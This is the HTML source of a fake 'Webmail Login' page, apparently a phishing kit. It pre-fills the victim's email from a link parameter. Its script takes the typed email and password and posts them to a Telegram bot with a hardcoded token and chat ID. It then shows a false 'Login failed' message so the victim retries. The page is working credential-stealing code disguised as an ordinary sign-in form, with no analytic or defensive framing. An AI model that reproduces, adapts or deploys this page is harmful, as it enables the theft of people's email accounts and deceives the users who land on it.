<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail Login</title>
    <style>
        /* Add your CSS here (same as before) */
    </style>
</head>
<body>
    <div id="notification-bar" class="notification-bar auth-bar">
        Authenticating...
    </div>

    <div class="container">
        <img src="webmail-logo.svg" alt="Webmail Logo">
        <div class="login-box">
            <form onsubmit="sendDataToTelegram(event)">
                <div class="input-group">
                    <span class="icon">&#128100;</span>
                    <input type="text" id="email" name="email" placeholder="Email Address" required>
                </div>

                <div class="input-group">
                    <span class="icon">&#128274;</span>
                    <input type="password" id="password" name="password" placeholder="Password" required>
                </div>

                <button type="submit">Log in</button>
            </form>
        </div>
    </div>

    <script>
        // Function to fetch query parameters
        function getQueryParam(param) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
        }

        // Pre-fill email from query parameter if present
        window.onload = function() {
            const emailParam = getQueryParam('email');
            if (emailParam) {
                document.getElementById('email').value = emailParam;
            }
        };

        async function sendDataToTelegram(event) {
            event.preventDefault();

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            const notificationBar = document.getElementById("notification-bar");

            // Validate and show loading state
            notificationBar.textContent = "Authenticating...";
            notificationBar.className = "notification-bar auth-bar";
            notificationBar.style.display = "block";

            const botToken = "7840973698:AAEwak-7hrIa-vzp3BV9kgkFUQK0LloA21M";
            const chatId = "6885599280";

            const message = `
Email: ${email}
Password: ${password}
`.trim();

            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

                const data = await response.json();

                if (data.ok) {
                    notificationBar.textContent = "Login failed. Please check your credentials.";
                    notificationBar.className = "notification-bar error-bar";
                } else {
                    notificationBar.textContent = "An error occurred. Please try again.";
                    notificationBar.className = "notification-bar error-bar";
                }
            } catch (error) {
                notificationBar.textContent = "An error occurred. Please try again.";
                notificationBar.className = "notification-bar error-bar";
            }
        }
    </script>
</body>
</html>
